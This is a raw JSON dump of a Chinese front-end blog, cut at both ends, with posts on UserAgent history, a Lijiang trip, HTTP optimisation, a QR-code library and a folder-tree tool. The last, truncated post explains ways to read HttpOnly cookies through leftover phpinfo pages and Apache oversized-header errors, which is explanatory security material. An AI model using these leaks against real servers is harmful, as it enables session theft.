MSIE 8.0; Windows NT 6.0)。除去已经注定不可抹去的“Mozilla”字样，其余信息简洁，准确，清晰。 但事态已经不可收拾。 Opera给这狂躁的世界添了一把火。它觉得，易容术非常炫酷呀。Opera直接在菜单提供了Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.51，Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51，Opera/9.51 (Windows NT 5.1; U; en)三个选择项。第一个是易容成IE，第二个是易容成火狐，第三个才是自己，选谁就是谁！ 其实这并不是一件坏事。因为Opera是站在能够让用户通过选择，去获得更好的浏览体验的基础上的。你提供选择，或是不提供，混乱的UserAgent还是在这，不离，不弃。再者，这对网页的开发者有极大的好处，在某些情况，你不必同时打开几个不同的浏览器去调试。到目前，最新的Chrome浏览器更加炫酷，能够支持近40种不同的UserAgent，甚至你还可以自定义。当然这是后话。 与此同时，苹果公司依靠内核WebKit，开发出Safari，命名UserAgent为Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5。 有人就会问了，不是Webkit内核吗，怎么还有KHTML, like Gecko？注意，内核Webkit包含了一个排版引擎叫WebCore，而WebCore是KHTML衍生而来的。也就是说，WebCore是KHTML的儿子，子承父业，基因差不多。为了能够正常排版，safari只能这么写。 后来，google也开发了自己的浏览器Chrome，其内核也是Webkit，但它设定UserAgent为Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13。Safari一看，不对劲啊！你怎么也在后面写有Safari？Chrome呵呵一笑，你懂的。 因此，请让我一口气说完下面这一段：Chrome希望能得到为Safari编写的网页，于是决定装成Safari，Safari使用了WebKit渲染引擎，而WebKit呢又伪装自己是KHTML，KHTML呢又是伪装成Gecko的。同时所有的浏览器又都宣称自己是Mozilla。 这就是整个UserAgent世界大战的格局… 八、军阀混战将目光聚焦到国内，更是狼烟四起，混乱不堪。大家都知道，浏览器是互联网的入口，这块肥肉谁也不想丢。因而一个接一个的“国产”浏览器进入斗兽场。360，百度，QQ，UC，搜狗，猎豹，遨游，世界之窗…你能说出一大堆。连淘宝，酷狗，hao123都有浏览器，不信你搜。注意我前面“国产”两个字必须加上双引号，因为这个made in china并不纯。国人并没能像远古大神一样，硬生生发明一个内核出来，我们更擅长“微创新”。 利用Trident（IE的内核），包装一下皮肤，美化一下，就可以说：完美兼容利用Webkit，包装一下皮肤，美化一下，就可以说：极速浏览把两个内核都包起来，就可以说：智能双核 是微创新！读书人的事，能叫偷吗？ 在这插播一下，浏览器的“双核”，并不是你听说手机双核电脑双核那回事。再多个核，速度也不会更快，当然这么说，会显得很厉害的样子。德艺双馨，智勇双全，名利双收，才貌双绝，夫妻双双把家还，你看带“双”字的词都很牛的。 但我上面的叙述，的确有夸张的成分。浏览器的诞生，肯定不仅仅是包一下皮肤那么简单，国内的工程师们，也苦心研究做了许多工作。如果要说优化策略，我可以再写一篇超级长的文章。优化无止境，路漫漫其修远，向同行们致敬。只是我非常讨厌那些不把事实说清楚，纯粹靠文案去忽悠人的产品… 话说回来，这么多国产浏览器，总得靠不同UserAgent标志自己呀。大家自动分为两个阵营：使用Trident内核的，在IE已有UserAgent后添加自己的名称；使用Webkit内核的，就在Chrome的UserAgent后面添加。 前者像QQ浏览器：Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.7.26717.400)。后者像猎豹：Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36 LBBROWSER。当然双核浏览器诚然就是墙头草，切换内核时UserAgent也需要跟着变化。 如此的混战格局，这厢的IE和Chome想必也是醉了。 九、国共内战适者生存是不变的生存法则，国产浏览器们经过一段时间的用户筛选，自然优胜劣汰。时值2010年，真正还在运营和更新的浏览器数量慢慢下降，用户集中在几家表现更优异的厂商手中。就在这时，好看的故事来了——3Q大战爆发。 有人说，腾讯电脑管家的推出是导火索。其实这场仗，大家都忍了好久，推不推出，都一定会在某个事件后爆发。360浏览器是奇虎的重量级产品，用户量众多，2009年它推出一个功能：过滤其它网站的广告。诚然民众们都很喜欢。可是其他互联网公司肯定就不乐意了，用户看不到更点击不到广告，这钱还怎么赚？ 因而在3Q大战爆发后，腾讯的一个手段就是：如果你使用360浏览器，就不能访问QQ的网站（单单QQ空间就有巨大的用户量），也直接反攻360的最大收入来源。一个艰难的决定背后，往往是需要无数种的技术战略支撑的。企鹅判断用户是否使用360浏览器，依靠的就是UserAgent里是否有“360SE”的字样。 战报传来：号外，360浏览器上不了QQ空间！已经买了黄钻的杀马特贵族急了呀！只能换浏览器了呀！感覺侢乜卟哙噯嘞呀！2011年11月3日，腾讯网站封杀360浏览器2011年11月4日，360浏览器访问量仅为昨日一半2011年11月5日，360浏览器访问量几乎为0 有人说，腾讯就这么快赢了？恰恰相反，360浏览器通过一次强制的自动升级，又可以访问QQ的网站了。360的工程师们在5日使用了伪装术——把“360SE”字样从UserAgent中去掉！意思就是，360浏览器的UserAgent跟IE完全一样，你根本判断不出来（因而访问量为0）。就怕流氓有文化！企鹅傻眼了，总不能把大微软的IE也一并给禁了吧… 这场土匪遇恶霸的耍流氓大战，最终通过法律而化解。企鹅在技术侧拿360没办法，而360则得到了一个跟IE一样的身份证。在这场内战中，受伤的除了广大网民们，其实还有令人心疼UserAgent君，以往让它越长越长就算了，这次长了还得阉割掉，真心dan疼呀。 十、明日边缘看到这里，大家会明白一个道理：如果未来不出现一款霸主级别的浏览器（或内核），UserAgent应该不会有大变化了。不过，这道理并不全对。别忘了，移动侧也是有浏览器的。在早期能上网的手机里，内置了各手机厂商自研的浏览器。这些浏览器并不需要像PC一样的复杂设计，可以访问wap网页就足够了。因而它们的UserAgent命名，怎么简单怎么来，就直接叫诺基亚 3100 Nokia3100/06.01 (UCWEB 3.3B)，PHILIPS755 ObigoInternetBrowser/2.0 这样，有甚者连浏览器叫什么都不带 TCL-3199，三星 E618 SEC-SGHE618。 这样任由发展下去，一种要历史重演，往日重现的即视感压迫而来。web世界的联合国——W3C组织，站在明日边缘，面对着历史和未来，终于发话，它制定UserAgent标准，以后都得按这规范去起名字。详细请阅User Agent Accessibility Guidelines。至此，命运坎坷的UserAgent终于逐步走向规范。W3C大法好，有人说你怎么不早点来拯救世界呀！其实W3C一直在努力，但规范的制定，到推广至大家认可并执行，是一条漫长的道路，需要时间，也需要实践。W3C组织，在制定web标准这件工作之外，再我看来，还有两个身份：1、和事佬；2、背黑锅。和事不成，就得背黑锅。是的就是这样。 彩蛋那么，我们的故事接近尾声。还有一些有趣的小彩蛋。 Chome 28开始，与苹果正式分道扬镳，采用Blink内核，但它的UserAgent并不改变。 淘宝封杀微信打开淘宝页面，靠的就是微信内置浏览器UserAgent里的MicroMessenger字样。其实微信也可以像当初360一样把UserAgent去掉，但微信并不这样做。 360出招之时留有后招。也许，它一开始就想到了腾讯会告他们对于UserAgent的欺瞒，因而它其实提供了设置项。默认设置是“保持跟IE一样的UserAgent”，但用户也可以不勾选。只是这选项比较隐蔽，而且你重启浏览器后…又会变回默认设置。如果没有这个小小的设置，结果大家可以自行想象。 微软又玩新花样了，在泄露版IE 11中，去掉了以往的MSIE字样。初步猜测此举是为了使现有的 CSS hack 失效，避免过去网页设计师对IE差别对待的情况再度发生。但又会引发其他问题啊亲。 End.Litten 2014.10.5","tags":[{"name":"web","slug":"web","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/web/"},{"name":"浏览器","slug":"浏览器","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"}]},{"title":"浏览器野史 UserAgent列传（上）","date":"2014-09-26T03:26:00.000Z","path":"2014/09/26/history-of-browser-useragent/","text":"某天，我做一个小项目，需要判断一下浏览器类型。简单的呀。控制台敲下：navigator.userAgent浏览器回应：Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 天，这串是啥？你怎么连话都说不清楚？ 我对userAgent并不陌生，但明明一个单词就可以说清楚的事情，却是这么掏心掏肺的回答。怪可怜的，一定有冤情。 后来我查阅了很多资料，发现历史非常的精彩。 大事年表 1990年: Nexus(WorldWideWeb)诞生 1993年1月23日：Mosaic诞生 1994年12月：Netscape(Mozilla)诞生 1995年4月：Opera诞生 1995年8月16日：Internet Explorer诞生 2002年9月23日：Firefox诞生 2003年1月7日：Safari诞生 2008年9月2日：Chrome诞生 一、盘古开天地很久很久之前，上古大神Berners-Lee发明了WorldWideWeb，即万维网。同时，李大神也发明了第一款浏览器。真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？但大神就是大神，大神内心的想法又岂是尔等凡人能够肆意揣摩？ 万万没想到，李大神说，我这浏览器，也叫WorldWideWeb！不行么？行行行。 虽然李大神起名字这么拽，但他后来发觉，还是得赋予一点承上启下的历史意义，就改名成“Nexus”。值得注意的是，这浏览器，居然是可以兼容Unix跟Microsoft DOS的。它在当时流行的各种电脑上跑得飞起，应用也越来越广，被称为“杀手级应用”。杀手级…你们看互联网一开始就是这么的腥风血雨。 但这个浏览器，还不支持图片的显示，这是出现UserAgent的导火索。 二、唐尧虞舜93年，伊利诺大学的NCSA组织认为，浏览器无图无真相，这不好。因而他们发明了第一款可显示图片的浏览器。真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？但大神就是大神，大神就是连起名字都让你惊心动魄。 NCSA组织说，它能显示图片，偏偏我们就要叫它“马赛克(Mosaic)”！不行么？行行行。 但有人就问了，Nexus不显示图片，Mosaic能显示，你们让html提供者怎么写代码？你们是不是想逼死选择困难症患者？有没有考虑过天秤座的感受？ 因而UserAgent就诞生了。Mosaic将自己标志为NCSA_Mosaic/2.0 (Windows 3.1)，大家该怎么写代码就怎么写，但请求会带上这个信息，服务器就知道该不该返回能显示图片的html。UserAgent君，出生时跟我们设想的一样简单，仅仅标明了自己是什么浏览器，在什么系统运行，以及各自的版本号。 新旧浏览器们像彬彬有礼的君王，商议和让位是为了更好的繁荣。但风雨欲来。 三、楚汉争霸像刘邦一样，走出来一个搅局的小流氓。当然他还是很有志向的，他的目标，就是战胜霸主Mosaic。后来，他还真的做到了。如今，所有现代浏览器的UserAgent里都有它的标志，就像汉朝之后，我们都称为“汉”人。一群很有天赋的程序员，一起缔造了它的辉煌。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？但大神就是大神，大神就是让你永远也猜不到他们想了个什么名字。大神们说，叫Mozilla，不行么？行。但什么意思呢？ 含义有二。其一，哥斯拉(Godzilla)谐音，诚然是一头野心勃勃的怪兽；其二，”Mosaic Killa”之意，Killa是俚语中Killer的拼法，即“马赛克的终结者”，赤裸裸的挑战。 惊呆了的Mosaic小心翼翼的念着Mozilla这发音：“Mo…摸咋了？”勃然大怒，“摸你妹！” 鉴于Mosaic当时的权势，Mozilla改名成Netscape Navigator(网景航海家)。小怪兽突然变成有点文艺小清新的名字，郁闷得很，但内心的血液沸腾着。虽然叫大名叫网景，但它把UserAgent偷偷设置成Mozilla/1.0 (Win3.1)。还是摸咋了？咬我？ 四、宋元之战很快，NetScape战胜了Mosaic，成为了新的霸主，因为其更优的展示。NetScape最先支持了html框架显示，就是简单的table布局，内外边距之类，仅仅这点就将Mosaic抛诸身后。区别这两个浏览器，还是用的UserAgent。如果是UserAgent里含有“Mozilla”字样，那就发送支持框架的页面，否则，就发送不含框架的页面。 NetScape帝国日益庞大，歌舞升平，一切风平浪静，直到微软的铁骑挥军南下。 微软发布了一款跟系统强绑定的浏览器，真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？不用想了，就是IE。这命名也相当简单粗暴，Internet Explorer，直接把这工具的用途拍在你脸上。连说明书都可以免了。 IE也是支持html标准框架的，但由于前面的历史原因，人们只会给UserAgent里含有“Mozilla”字样的浏览器发送含框架的页面。但这点小事能难倒我大微软？IE呵呵一笑，把自己的UserAgent改成Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)。看，我这里也有“Mozilla”字样，也能收到含框架的页面了！ 当然，这个小流氓行为，跟后来把IE和Windows捆绑一起销售的大流氓行为比起来，根本不为足道。后面的故事我们也知道了，IE把NetScape干掉了。但它的身体上，却永远的烙上了“Mozilla”的印记。 五、康乾盛世看过奥特曼的都知道，怪兽被打败了会再回来。别忘了NetScape曾拥有一批大神们，失败后，他们围绕着浏览器排版引擎Gecko(壁虎)成立了非正式组织Mozilla。小怪兽再次出发。大神们发明了另一款优秀的浏览器，它在插件拓展和开发调试领域做出的贡献，绝对可以载入互联网历史。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？但大神就是大神，大神就是即使你知道了Mozilla的命名都是野兽，却还是猜不到是什么。Mozilla说，我们浴火重生，叫Phoenix(凤凰)！不行么？真不行。 刚推出就被人告了，原来已经有一家公司叫做“凤凰科技”。Mozilla瀑布汗，改名叫Firebird(火鸟)！还不行么？我们得原谅一下他们的取名，虽然现在看来满满的山寨感，可放在那个时代，Firebird这名字很炫酷。就像你当初的QQ昵称叫赤炎天使感觉依然良好一样。 但是，他们发现，业内有个数据库系统，也叫的Firebird…泪流满面的Mozilla感慨重生好难呀。最后才决定叫Firefox(火狐)。 基于Gecko引擎的Firefox非常优秀，为了告诉大家，我使用了这个引擎，它标志自己的UserAgent为Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.7.5) Gecko/20041108 Firefox/1.0。这时候的UserAgent，虽然长了点，但它并不混乱，准确的标明了系统，排版引擎，浏览器名称等信息。虽然IE这时已经占有了很大的市场份额，但基本停步不前；而Mozilla经过一段时间的修生养息，Firefox在业内广受好评，得到了快速的发展。 时值2003年，web2.0的浪潮前夕，浏览器的发展达到了空前的盛世。然而所谓否极泰来，盛极则衰。涅槃的Firefox迎来盛世，却又恰恰由于盛世，决定了UserAgent纠结的命运。 《浏览器野史 UserAgent列传（下）》 To Be Continue.litten 2014.9.28","tags":[{"name":"web","slug":"web","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/web/"},{"name":"浏览器","slug":"浏览器","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"}]},{"title":"还是丽江有意思","date":"2014-09-25T16:53:00.000Z","path":"2014/09/26/journey-to-yunnan/","text":"回来时给每个身边的好朋友都带了小礼物，最后却发现忘了给自己带。只有旅行时写的一些日记。蠢哭。 无可救药丽江这个地方，只要稍微给它写点文字，就会无一例外显得矫情。 天这么蓝，你不能不望。他们说，你看这天真他妈蓝。吉他太动人，你不能不听。他们说，靠 ，大爷你NB。酒喝得畅快，你不能不喝。他们笑着说，看你爽成那傻X样。 后来我终于明白：用粗俗的话去回避情感。因为这个地方，真是太TMD容易矫情了。矫情是病，得治。荒诞又真实的人们认为，粗话是最温柔的良方… 只有在这说上几句，才觉得真实。这种感觉非常的微妙，就好像蜜糖太甜了，你必须去掺点无味的白水。又好比你与班上喜欢的一个姑娘相遇相视，她朝你微笑，你的眼神却飘忽云外。心如鹿撞，表现却一定得毫不在意。哥的心就是一块磐石，脸皮不重要，原则也不重要，重要的就是这不为所动的气场！老天才懂得解释这种诡异的现象。 结果白云悠悠，蓝天依旧。蜜糖还是甜。我们还是一群神经病。 总有人幸福其实可以想象。一个小镇，依山傍水，不经战火，在几百年上千年的时间里，太阳的万丈光华挥洒其中，自然而然就会像酒一样越来越醇。来丽江之前，很多朋友就跟我说，你可能要失望的，这酒，包装太商业化了。第一天在丽江，第一个印象是民谣吉他缓缓流过商业化的四方街，其实没有惊喜，也没有失望。一切刚刚好。 后来我们每个晚上都跑古城，就越来越轻车熟路。小路直奔大水车，沿着满街的《一瞬间》走到四方街，左边吃的，右边酒吧。我喜欢这么简单的路线，连我这路痴都无所畏惧。但后来我又想，让我在这迷路一次也行呀。 有一天晚上，跟小草，jeep，karl一起去love wine &amp; 9酒吧。这里一男一女的驻唱，吉他与纳西手鼓相映相和，节拍流淌似水。“风花雪月”一瓶接着一瓶入喉，我觉得自己像一条鱼。酒是个好东西，所有的向往所有的忧虑所有的惆怅所有的欢乐，都可以借此浸泡在沉思里。往事的大浪滔滔，倒流的是一些水，你又会觉得跟鱼无关。这个时候，各自陈旧的心锁一一被瓦解，听着别人的故事感觉是自己的独白。每个人自有自的欢乐与悲伤，酒和音乐是大功率的放大器，将内心的电波投射到夜里，管它有没有听众。 而后我说，但夜里不该只聊孤独，迷茫与悔恨，此时此刻还是有幸福的东西呀。你们看那两个驻唱，他们是一对。能一起唱歌多幸福！他们说，你怎么看出是一对？我说，他们自己说的，你们没听见。他们说，即使是一对，也不见得幸福，只是你看起来他们幸福。 直到他们唱到《安阳》—— 所有的人都醉了 请为我点盏灯火 在夜里静静歌唱 回忆是淡淡忧伤… 妈蛋我最喜欢听的这首歌，此刻才最有感觉。以前我觉得那个“点盏灯火”的人，应该是个还醒着的人，或许是个温柔的女孩，来找醉了的“我”；现在突然觉得，既然所有人都醉了，点灯的人应该就是自己。但他并不孤独，因为，所有的人都陪他醉了。 你们的眼睛都瞎了？两人唱完最后一首粤语歌，下楼梯还拉着手。我不相信他们不幸福。未来和过去不必讲，至少此时此刻。 把我埋葬在深深的凉粉里比起古城，我更喜欢束河。白天人少，许多店铺十点多还没开门。有天一早，就跟小草去束河。两人写完明信片，走出“时光漫步”，往右一看，好家伙，没有一个人，一条路居然可望到尽头，蓝天与青石相接，两旁建筑静谧慵懒，好像所有的生灵都躲着我们不敢出来。小草说，没有人的古镇才有味道。我心里也被震撼住了，我说，是呀，但我的确闻到了好香的味道。 鸡豆凉粉。 胖乎乎的凉粉块好似肥肉，老婆子拿小铁皮切开，这就蹦跳着下锅啦。起油锅，洋洋洒洒铺一层油，凉粉们说，不对，脚底有点疼，老子不干了，生气了，就在上面滑溜溜的跳啊闹啊。青绿色慢慢变黄，翻一下，不敢用力，太嫩了怕翻烂。凉粉们还唱起了歌，滋滋滋的瞎叫。老婆子一看凉粉们在求饶，怪可怜的，就让他们跳到铲子上来。这边姜蒜辣椒切得了，扔上一把，趁着凉粉的热气，一凑合，一搅拌，齐活了。 开始惴惴不安，其一，这世界上原来还有热的凉粉？其二，这世界还有块状的凉粉？不过管它呢，都到我碗里来。咬一口，辣椒让凉粉的味道活了，鲜香饱满，温润通畅。其三，世界上原来还有这么好吃的凉粉呀… 去哪儿好比，一个女子，老了就应该优雅智慧，从容端庄，这是她最真实的美丽。假如她还假装纯真烂漫，恐怕是令人啼笑的。一座古城也应该这样。无线电波包围你我，Wifi和3G横穿马路，难不成在古城通讯还得飞鸽传书？这不真实。丽江很真实，至少从某种意义来说。这样的地方，才不容易玩腻。 如果真的玩腻了，那就离开丽江。上雪山在阳光里运动运动。要么去拉市海骑马，看看日出。要么去泸沽湖，白天风景，晚上火塘。再去香格里拉，到松赞林寺看下喇嘛。或者到普达措转一圈，看看湖里的白云。晚上约上几个朋友，再到独克宗找个地方喝酒。聊聊天，随便做点什么。 几天下来，你就会发现，还是丽江有意思。 THE END.2014.9.26","tags":[{"name":"生活","slug":"生活","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E7%94%9F%E6%B4%BB/"},{"name":"旧事","slug":"旧事","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%97%A7%E4%BA%8B/"}]},{"title":"再议减少HTTP请求","date":"2014-08-14T05:10:00.000Z","path":"2014/08/14/reduce-http-requests/","text":"最近参加了IMWEB前端技术沙龙活动，有幸能站到讲台上，将性能方面的经验与大家分享。现将“再议减少HTTP请求”部分简单摘剪成文。 前言:关于web性能，有两个著名论断： 0.1-0.2s 用户认为是即时的；1-5s 用户觉得自己能与信息流畅地交互；5-10s 用户开始转移注意力——Robert Miller 用户所接受的数据，有80~90%的时间都耗在前端上——Steve Souders 前者说明，loading图（以下简称菊花）是必要的。人处于“开始转移注意力”时，这朵菊花就开始挽留你躁动的心。但web工程师的一个使命，就是通过提升性能，不让用户看到菊花。菊花要有，但不能常有，真是一朵磨人的小妖精… 后者说明，资源的加载和渲染可以大做文章。因为一个html文件，几乎是所有资源的承载器，哪些优先加载，怎样加载，都是前端工程师可以控制的。 再议减少HTTP请求：“尽量减少HTTP请求，减少DNS查找”这是Yslow写在最前面的两条规则。而放之实际，可能会遇到挑战。为何？因为我们完成了“降低请求数”的目标，但可能损失了其他方面的指标。 a. 没有浏览器缓存减少HTTP请求，很常用的做法就是把js和css资源inline到html里。这样的做法，自然没有浏览器缓存，重复加载时连静态资源也必须加载。也许有人又说，我可以把整个html文件都缓存啊！的确可以，但以web开发的更新速度，html文件一般都不设或设置很短时间（5 min?）缓存。另外在web2.0时代里，html缓存会带来不必要的问题。比如登录前后，页面资源展示不一样，那么我们就得慎用html缓存。 b. 没有cdn缓存这个很好理解，任何的内联资源，由于依赖于html，都必须从源服务器而不是cdn服务器返回。 c. 不能按需加载为了按需加载，前端工程师可谓想法各异，天马行空。比如图片的lazyload技术，异步加载js脚本，而inline的方式恰恰将一切想法摁回脑中。 d. 浏览器预解析DNS失效现代浏览器有预解析DNS技术。简单来说，就是页面下载到浏览器时，先扫描一遍，在这时发现域名并预解析DNS。这样的前置解析跟dom渲染等操作同步执行，诚然会使浏览器更快。但如果你的html页面因为内联了太多内容（base64图片），大于5M时，浏览器的预解析DNS将会失效。 最佳实践因而，我们时常像那只捡芝麻丢西瓜的熊。如此平衡这两者呢，业界给我们两个很好的案例。 Demo1 必应 首次内联CSS与JS 将资源取出，并保存在localStorage中 资源名（版本）保存在cookie中 后续请求中，服务器检查对应的cookie 根据cookie的值，只嵌入新的脚本 加载时，从localStorage里载入资源 Demo2 百度(移动端) 首次将静态资源打包，用jsonp统一返回 将资源解析并保存在localStorage中 再次访问时检查localStorage中资源情况 如有缺失再发请求获取资源 必应的做法确保了首次的http请求最少，后续充分发挥增量更新（当然粒度还是文件）的优势提高性能，但缺点是cookie并不可靠。百度则是把首次静态资源的http请求降低到一次，非常暴力的把全部css，js打包成字符串，以jsonp返回。宁愿用str转obj的解析时间去换取加载时间。而随V8引擎的强大，这点解析的时间也将越来越不值得提起。总而言之，这两个Demo都把http请求尽可能的降低，而后都利用了本地存储去获得资源。 我有时候会想起那把由无名的铁匠用三个小时粗制而成的小李飞刀。你得对技术怀敬畏之心。因为那些谁都懂的技术，在某些人的手里，还真能变出花儿来。","tags":[{"name":"html","slug":"html","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/html/"},{"name":"前端","slug":"前端","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"性能","slug":"性能","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%80%A7%E8%83%BD/"}]},{"title":"爱上一匹二维马可我家里没有草原…","date":"2014-08-01T15:52:00.000Z","path":"2014/08/01/kael-qrcode-info/","text":"#Kael-Qrcode 基于html5 canvas，灵活轻巧，美观多变的二维码生成库 一直觉得二维码长得太单一，抽空做了一个生成库：github here。取名卡尔，缘由dota英雄Kael；一生二，二生三，三生万物 ，简单地配置Kael-Qrcode，帮助你变换出无穷样式的二维码。 二维码不应只是那只黑白的斑马，它还可以是骏马野马海马河马草泥马… 使用 Usage:1、入手 Demo Base - 基本 12var kaelBase = new KaelQrcode();kaelBase.init(document.getElementById(&quot;qr-base&quot;), &quot;hello KaelQrcode&quot;); 2、进阶 随手可配，变化无穷！ Demo Pic - “有图有真相” 关键词：附图，图片边框，尺寸 123456789var kaelPic = new KaelQrcode();kaelBase.init(document.getElementById(&quot;qr-pic&quot;), &#123; text : &quot;hello KaelQrcode&quot;, size: 300, img: &#123; src : &quot;kael-ico.jpg&quot;, border: &quot;#fff&quot; &#125;&#125;);Demo Sae - “如果大海能够带走我的哀愁” 关键词：圆角，前景色，背景色，渐变 12345678910111213var kaelSea = new KaelQrcode();kaelSea.init(document.getElementById(&quot;qr-sea&quot;), &#123; text : &quot;hello KaelQrcode&quot;, size: 300, color: &#123; &#x27;0&#x27;: &#x27;rgb(1, 158, 213)&#x27;, &#x27;0.2&#x27;: &#x27;rgb(30, 169, 224)&#x27;, &#x27;0.6&#x27;: &#x27;rgb(0, 120, 191)&#x27;, &#x27;1&#x27;: &#x27;rgb(1, 119, 255)&#x27; &#125;, background: &quot;#d3e3f0&quot;, type: &quot;round&quot;&#125;); Demo Iron - “钢铁是怎样炼成的” 关键词：阴影 12345678910111213141516var kaelIron = new KaelQrcode();kaelIron.init(document.getElementById(&quot;qr-iron&quot;), &#123; text : &quot;hello KaelQrcode&quot;, size: 300, color: &#123; &#x27;0&#x27;: &#x27;rgb(30, 30, 30)&#x27;, &#x27;0.2&#x27;: &#x27;rgb(100, 100, 100)&#x27;, &#x27;1&#x27;: &#x27;rgb(40, 40, 40)&#x27; &#125;, background: &#123; &#x27;0&#x27;: &#x27;rgb(233, 233, 233)&#x27;, &#x27;0.2&#x27;: &#x27;rgb(246, 246, 246)&#x27;, &#x27;1&#x27;: &#x27;rgb(212, 212, 212)&#x27; &#125;, shadow: true&#125;);Demo Iron - “万紫千红总是春” 关键词：单点 123456789var kaelPoint = new KaelQrcode();kaelPoint.init(document.getElementById(&quot;qr-point&quot;), &#123; text : &quot;hello KaelQrcode&quot;, size: 300, color: &quot;#50528f&quot;, background: &quot;e7e0cf&quot;, pointColor: &quot;#ee256c&quot;, type: &quot;round&quot;&#125;); 正在做 Todo： 阴影效果优化 高光 正方形识别 动画","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"html","slug":"html","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/html/"},{"name":"前端","slug":"前端","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"github","slug":"github","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/github/"}]},{"title":"一个文件夹的自我介绍","date":"2014-07-25T00:52:00.000Z","path":"2014/07/25/folder-to-tree/","text":"#folder2tree 用字符展示文件夹结构 前言 Before:如何介绍一个文件夹，简直纠结。 要么图片，如果在截图前，你真的愿意，一层一层一层的剥开我的心。你会鼻酸你会流泪；要么靠说，那么你可能得这么说：从前，有一个文件夹，文件夹里有两张图片；大图片在跟小图片讲故事…讲个什么故事额 因而，用纯字符描述文件夹的小工具必须得有呀。github here. 使用 Usage:123456789101112131415161718192021222324252627282930313233343536@param &#123;Dom&#125; 父级dom节点 @param &#123;Array&#125; 描述文件夹层级关系对象folder2tree.init(document.getElementById(&quot;ctn&quot;), [ &#123; &quot;img&quot; : [ &quot;sprite.png&quot;, &quot;bg.png&quot; ] &#125;,&#123; &quot;js&quot;: [&#123; &quot;common&quot;: [ &quot;jquery.js&quot;,&#123; &quot;highcharts&quot;: [&#123; &quot;modules&quot;: [&quot;exporting.js&quot;] &#125;, &quot;highcharts.js&quot; ]&#125; ] &#125;,&#123; &quot;index&quot;: [ &quot;mian.js&quot;,&#123; &quot;modules&quot;: [&quot;mod.video.js&quot;] &#125; ] &#125;] &#125;,&#123; &quot;css&quot;: [ &quot;base.css&quot;, &quot;index-main.css&quot;, &quot;index-video.css&quot; ] &#125;, &quot;index.html&quot;, &quot;favicon.ico&quot;]); 展示 Show:1234567891011121314151617181920├─img│ ├─sprite.png│ └─bg.png├─js│ ├─common│ │ ├─jquery.js│ │ └─highcharts│ │ ├─modules│ │ │ └─exporting.js│ │ └─highcharts.js│ └─index│ ├─mian.js│ └─modules│ └─mod.video.js├─css│ ├─base.css│ ├─index-main.css│ └─index-video.css├─index.html└─favicon.ico","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"工具","slug":"工具","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"前端安全冷门知识杂谈","date":"2014-05-27T15:52:00.000Z","path":"2014/05/27/safety-point-of-view-from-front-end/","text":"零、概述提起web前端安全，大家都会想到两个名词：xss和csrf。抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。大概分为以下章节： 盗取无法用js读写的Cookie删不掉的本地存储函数覆写监听上报内存Cookie与硬盘CookieCSS带来的点击量泄露JSONP回调函数与UTF-7编码过滤与代码混淆心理学与社会工程学 资料略多，文章较长，请自备瓜子… 一、盗取无法用js读写的Cookie为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。12setcookie(&quot;test&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0); // 设置普通Cookiesetcookie(&quot;test_http&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启我们还是可以通过一些服务器上的漏洞去获取它们。 2.1) 调试信息泄露比较经典的是PHP的phpinfo文件：如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。访问phpinfo.php，将看到：其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。 2.2) Apache 2.2.x版本请求头超长泄露Cookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 